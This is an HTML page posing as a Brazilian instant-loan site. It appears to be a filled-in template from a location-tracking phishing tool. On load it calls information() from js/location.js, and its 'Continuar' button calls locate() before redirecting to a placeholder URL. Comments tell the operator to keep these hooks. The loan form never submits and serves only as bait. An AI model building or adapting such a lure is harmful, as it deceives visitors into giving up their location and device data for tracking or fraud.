<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Crédito Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- seu CSS -->
  <link rel="stylesheet" href="style.css">

  <!-- manter isso -->
  <script>
    if (window.location.protocol == "http:") {
      var restOfUrl = window.location.href.substr(5);
      window.location = "https:" + restOfUrl;
    }
  </script>

  <!-- manter isso -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="js/location.js"></script>
</head>

<!-- manter onload -->
<body onload="information();">

<div class="top-bar">
  <span class="site">Crédito Digital</span>
  <span class="url">secure-credit.com</span>
</div>

<header style="text-align:center; padding:20px;">
  <h1>Crédito aprovado na hora</h1>
  <p>Solicite seu empréstimo com rapidez e segurança</p>
</header>

<section class="card">

  <h2>Simule seu empréstimo</h2>

  <form onsubmit="event.preventDefault();">

    <input type="text" placeholder="Nome completo" required>
    <input type="tel" placeholder="WhatsApp" required>
    <input type="number" placeholder="Valor desejado (R$)" required>

    <!-- BOTÃO ORIGINAL ADAPTADO -->
    <button type="button"
      onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Erro');});">
      Continuar
    </button>

  </form>

  <div class="badges">
    <span>✔ Sem burocracia</span>
    <span>✔ Resposta imediata</span>
    <span>✔ 100% online</span>
  </div>

</section>

<footer style="text-align:center;">
  <p>© Crédito Digital</p>
</footer>

</body>
</html>
